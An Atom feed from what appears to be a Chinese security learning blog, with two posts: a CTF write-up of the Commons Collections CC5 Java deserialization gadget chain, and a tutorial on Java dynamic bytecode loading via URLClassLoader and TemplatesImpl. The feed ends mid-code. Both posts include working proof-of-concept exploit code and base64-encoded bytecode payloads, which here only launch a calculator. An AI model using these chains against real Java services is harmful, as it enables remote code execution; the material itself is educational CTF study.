<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcdm123</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-10T00:50:40.311Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>海马少年</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java CC链5</title>
    <link href="http://example.com/2021/11/10/Java-CC%E9%93%BE5/"/>
    <id>http://example.com/2021/11/10/Java-CC%E9%93%BE5/</id>
    <published>2021-11-10T00:27:02.000Z</published>
    <updated>2021-11-10T00:50:40.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-CC5"><a href="#Java-CC5" class="headerlink" title="Java CC5"></a>Java CC5</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在打东华杯的时候遇见一个 java 反序列化的题目，但是当时没有学习 Java CC5 的链子所以死活没有做出来，所以趁着这个机会一起学习一下 CC5 的链子。</p><blockquote><p>当时没有做出来是不知道怎么让 toString 方法自动调用，太亏了，后面问学长，学长都懒得回答这么菜的问题，属实是太菜了呀</p></blockquote><h2 id="CC5-分析"><a href="#CC5-分析" class="headerlink" title="CC5 分析"></a>CC5 分析</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108222024890.png" alt="image-20211108222024890"></p><p>这个链子和 CC1的前大半部分是一样的，目的都是要调用到 <code>LazyMap</code> 类的 <code>get()</code> 然后触发命令执行。CC5链子使用了<code>BadAttributeValueExpException</code>类来代替<code>AnnotationInvocationHandler</code>类，还利用了一个新的类来调用<code>LazyMap</code>的<code>get</code>方法</p><p>在 CC1 中我们利用<code>LazyMap</code>类调用<code>get()</code>时造成命令执行的方法构造了利用链，不过在后面的版本中修复了<code>AnnotationInvocationHandler</code>类，所以这里就找到了一个新的利用链(CC5)</p><p>首先找到一个可以利用的<code>get()</code>方法，所以就 找到了<code>TideMapEntry</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220006308.png" alt="image-20211108220006308"></p><p>这里虽然有<code>get()</code>方法，但是要怎么触发呢？在这个类中发现<code>toString()</code>方法调用到了这个 函数，所以这里的问题就变成了如何调用到<code>toString()</code>方法？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220120895.png" alt="image-20211108220120895"></p><p>这里就利用到了<code>BadAttributeValueExpException</code>类，这个类的<code>readObject()</code>方法中会调用<code>toString()</code>方法 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108220411317.png" alt="image-20211108220411317"></p><p>所以我们的思路就清楚了，借助<code>BadAttributeValueExpException</code>类反序列化时调用<code>TideMapEntry</code>类 <code>toString()</code>最后调用到<code>getalue()</code>中的<code>get()</code>触发命令执行</p><p>POC中大部分和CC1相同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                  <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                  <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = LazyMap.decorate(inermap,chainedTransformer);<br><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outermap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(expException, tiedMapEntry);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(expException);<br>        objectOutputStream.close();<br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211108221156107.png" alt="image-20211108221156107"></p><h2 id="东华杯-Java-复现"><a href="#东华杯-Java-复现" class="headerlink" title="东华杯 Java 复现"></a>东华杯 Java 复现</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109150754356.png" alt="image-20211109150754356"></p><p>看到这里我们就够马上反应出 CC5 和利用 <code>defineClass</code> 加载字节码的操作，利用<code>javax.management.BadAttributeValueExpException</code>的<code>readObject()</code>方法调用到<code>ToStringBean</code>的<code>toString()</code>方法，最后利用<code>defineClass()</code>动态加载字节码完成命令执行</p><p>先构造需要使用的字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109235536455.png" alt="image-20211109235536455"></p><p>编写序列化利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lcdm123;<br><br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException </span>&#123;<br>        ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();<br>        Class clazz1 = Class.forName(<span class="hljs-string">&quot;com.ezgame.ctf.tools.ToStringBean&quot;</span>);<br>        Field ClassByte = clazz1.getDeclaredField(<span class="hljs-string">&quot;ClassByte&quot;</span>);<br>        ClassByte.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHgoABwAQBwARCAASCgATABQKABMAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENv&quot;</span> +<br>                <span class="hljs-string">&quot;ZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAKU291cmNlRmlsZQEADFVSTFRl&quot;</span> +<br>                <span class="hljs-string">&quot;c3QuamF2YQwACAAJAQAQamF2YS9sYW5nL1N0cmluZwEAEGdub21lLWNhbGN1bGF0b3IHABkMABoA&quot;</span> +<br>                <span class="hljs-string">&quot;GwwAHAAdAQAHVVJMVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9u&quot;</span> +<br>                <span class="hljs-string">&quot;AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAEAAQAIAAkAAgAKAAAAOwAEAAIAAAAXKrcAAQS9AAJZAxIDU0y4AAQrtgAFV7EAAAABAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAASAAQAAAAEAAQABQAOAAYAFgAHAAwAAAAEAAEADQABAA4AAAACAA8=&quot;</span>);<br>        ClassByte.set(toStringBean,bytes);<br><br>        BadAttributeValueExpException expException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        Class clazz2 = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        Field val = clazz2.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-keyword">true</span>);<br>        val.set(expException, toStringBean);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objOutputStream.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>        objOutputStream.writeInt(<span class="hljs-number">2021</span>);<br>        objOutputStream.writeObject(expException);<br>        objOutputStream.close();<br>        Base64.Encoder encoder = Base64.getEncoder();<br>        String result = encoder.encodeToString(byteArrayOutputStream.toByteArray());<br>        System.out.println(result);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109235709887.png" alt="image-20211109235709887"></p><p>成功弹出计算机</p><blockquote><p>注意使用URL编码一下</p></blockquote><p>在没有回显的情况下可以使用 <code>DNSlog</code> 测试一下（学校晚上断网所以只好在本地弹计算机玩玩了）</p><p>需要注意的点：</p><ul><li>POC这里需要保持类的路径一样</li></ul><p><del>这里复现失败了不知道是什么原因，POC的思路和我的是一样的</del> 太粗心了</p><p>这个题目现在看来确实简单，当时没有学习所以硬是没有看出来，确实是太菜了呀，已经又在反省了。</p><p>参考文章</p><p><a href="https://su18.org/post/ysoserial-su18-2/">https://su18.org/post/ysoserial-su18-2/</a></p><p><a href="https://y4er.com/post/ysoserial-commonscollections-5/">https://y4er.com/post/ysoserial-commonscollections-5/</a></p><p><a href="https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/">https://www.guildhab.top/2020/06/java-rmi-%e5%88%a9%e7%94%a84-%e6%9c%80%e5%9f%ba%e6%9c%ac%e7%9a%84%e4%b8%a4%e6%9d%a1-apache-commons-collections-pop-gadget-chains/</a></p><p><a href="https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">https://reader-l.github.io/2021/05/17/Java%E5%AE%89%E5%85%A8-CommonsCollections5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://ego00.blog.csdn.net/article/details/119734674">https://ego00.blog.csdn.net/article/details/119734674</a></p><p><a href="https://ego00.blog.csdn.net/article/details/121072948">https://ego00.blog.csdn.net/article/details/121072948</a></p><p><a href="https://ctf.njupt.edu.cn/724.html">https://ctf.njupt.edu.cn/724.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-CC5&quot;&gt;&lt;a href=&quot;#Java-CC5&quot; class=&quot;headerlink&quot; title=&quot;Java CC5&quot;&gt;&lt;/a&gt;Java CC5&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java动态加载字节码</title>
    <link href="http://example.com/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <id>http://example.com/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</id>
    <published>2021-11-10T00:26:31.000Z</published>
    <updated>2021-11-10T00:50:54.043Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-动态加载字节码"><a href="#Java-动态加载字节码" class="headerlink" title="Java 动态加载字节码"></a>Java 动态加载字节码</h1><p>严格的说，java 字节码其实仅仅指的是 java 虚拟机执行使用的一类指令，通常存储在 class 文件中。这里的字节码可以理解为所有能够恢复成一类并且在JVM虚拟机里面加载的字节序列。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p><code>ClassLoader</code>就是一个加载器，告诉JVM如何加载这个类，java默认的<code>ClassLoader</code>就是根据类名来加载类，这个类名是类的完整路径，比如<code>java.lang.Runtime</code></p><p>正常情况下，java 会根据配置项<code>sun.boot.class.path</code> 和 <code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找 .class 文件来加载，这个基础路径分为三种情况：</p><ol><li><p>URL未以<code>/</code> 结尾，则认为是一个 jar 文件，使用<code>JarLoader</code>来寻找类，即为在jar包中寻找 .class 文件</p></li><li><p>URL以<code>/</code>结尾，且协议名为<code>file</code>则使用<code>FileLoader</code>来寻找类，即为在本地文件系统中寻找 .class 文件</p></li><li><p>URL以<code>/</code>结尾，且协议名不是<code>file</code>，则使用最基础的<code>Loader</code>来寻找类</p><blockquote><p>正常情况下是使用的前两类，第三种情况中最常见的协议就是<code>http</code></p></blockquote></li></ol><p>利用<code>URLClassLoader</code>加载远程 .class 文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109003101520.png" alt="image-20211109003101520"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109002927864.png" alt="image-20211109002927864"></p><p>成功加载了服务器上的函数代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109003256333.png" alt="image-20211109003256333"></p><h2 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h2><p>不管是加载远程 class 文件，还是本地的 class 文件或 jar文件， 都会经历下面三个方法调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109112249145.png" alt="image-20211109112249145"></p><ul><li><code>loadClass</code> 的作用是从已经加载的类缓存，父加载器等位置寻找类（双亲委派机制），在没有找到的情况下执行<code>findClass</code></li><li><code>findClass</code> 的作用就是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统，jar包或者远程http服务器上读取字节码然后交给<code>defineClass</code></li><li><code>defineClass</code>的作用就是处理前面传入的字节码，将其处理成真正的类</li></ul><p>所以核心部分就是<code>defineClass</code> 它决定了如何将字节码转换为 java 类，java 默认的<code>ClassLoader#defineClass</code>是一个 native 方法，逻辑主要在 JVM 的C语言代码中</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109010604955.png"></p><p>由于 <code>ClassLoader#defineClass</code>方法是 protected 所以无法直接调用需要使用反射的方式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109010548813.png" alt="image-20211109010548813"></p><p><img src="D:\markdown\image-20211109120744346.png" alt="image-20211109120744346"></p><p>在实际情况中<code>defineClass</code>的方法作用域是不开放的，所以很少直接利用它进行工具，但是在<code>TemplatesImpl</code>中经常利用到它</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>在<code>TemplatesImpl</code>中定义了一个内部类<code>TransletClassLoader</code>，在这个类中重写了<code>defineClass()</code>,</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109122411306.png" alt="image-20211109122411306"></p><p>反过来追踪一下调用链</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123220585.png" alt="image-20211109123220585"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123310590.png" alt="image-20211109123310590"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123332228.png" alt="image-20211109123332228"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211109123353576.png" alt="image-20211109123353576"></p><p>最后追踪到的地方就是 <code>newTransformer()</code> 和 <code>getOutputProperties()</code> 它们的作用域都是 public 可以被外部调用。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>  -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>这里利用<code>newTransformer()</code>来构造POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLUse</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, MalformedURLException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException, TransformerConfigurationException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = base64decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABZUZW1wbGF0ZXNJbXBsVGVzdC5qYXZhDAAOAA8HABsMABwAHQEADUhlbGxvIGxjZG0xMjMHAB4MAB8AIAEAHW9yZy9sY2RtMTIzL1RlbXBsYXRlc0ltcGxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADQALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABIACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAAVAAQAFgAMABcAAQAQAAAAAgAR&quot;</span>);<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] base64decode(String encode)&#123;<br>        Base64.Decoder decoder = Base64.getDecoder();<br>        <span class="hljs-keyword">return</span> decoder.decode(encode);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>setFieldValue()</code>利用反射的方法将私有属性反射出来让我们可以利用，这里利用了三个变量<code>_bytecodes</code> <code>_name</code> <code>_tfactory</code>。 <code>_bytecodes</code>是由字节码组成的数组；<code>_name</code>是任意字符串，<code>_tfactory</code> 需要一个<code>TransformerFactoryImpl</code>对象，因为<code>TemplatesImpl#defineTransletClasses() </code>方法里有调用到<code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。<a href="http://wjlshare.com/archives/1509">http://wjlshare.com/archives/1509</a></p><p>并且<code>TemplatesImpl</code>中对加载的字节码有一定的要求，这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet </code>的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span 